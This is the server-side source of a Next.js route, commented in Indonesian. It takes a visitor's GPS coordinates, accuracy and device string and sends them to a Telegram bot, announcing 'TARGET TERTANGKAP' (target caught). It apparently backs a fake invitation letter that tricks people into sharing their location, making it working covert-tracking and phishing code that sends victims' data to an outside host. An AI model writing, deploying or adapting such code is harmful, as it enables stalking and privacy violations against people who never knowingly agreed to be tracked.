import { NextResponse } from 'next/server';

export async function POST(request: Request) {
  try {
    const { lat, lng, accuracy, userAgent } = await request.json();
    
    // ==========================================
    // PENTING: ISI TOKEN DAN CHAT ID DI BAWAH INI
    // ==========================================
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID || "8406125410";
    
    if (!BOT_TOKEN) {
      console.error("TELEGRAM_BOT_TOKEN belum di-set di Environment Variables");
      return NextResponse.json({ success: false, error: "Server Configuration Error" }, { status: 500 });
    }
    

    
    const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
    const timestamp = new Date().toLocaleString("id-ID");
    
    const message = `📍 *TARGET TERTANGKAP* 📍\n\n` +
      `Seseorang telah mengizinkan lokasi di Surat Undangan!\n\n` +
      `🗺️ *Link Maps:* ${mapsLink}\n` +
      `📌 *Koordinat:* \`${lat}, ${lng}\`\n` +
      `🎯 *Akurasi:* ±${Math.round(accuracy)} meter\n` +
      `🌐 *Device:* ${userAgent.substring(0, 100)}...\n` +
      `⏰ *Waktu:* ${timestamp}`;
      
    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    await fetch(telegramUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "Markdown"
      })
    });
    
    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("Gagal mengirim ke Telegram:", error);
    return NextResponse.json({ success: false }, { status: 500 });
  }
}
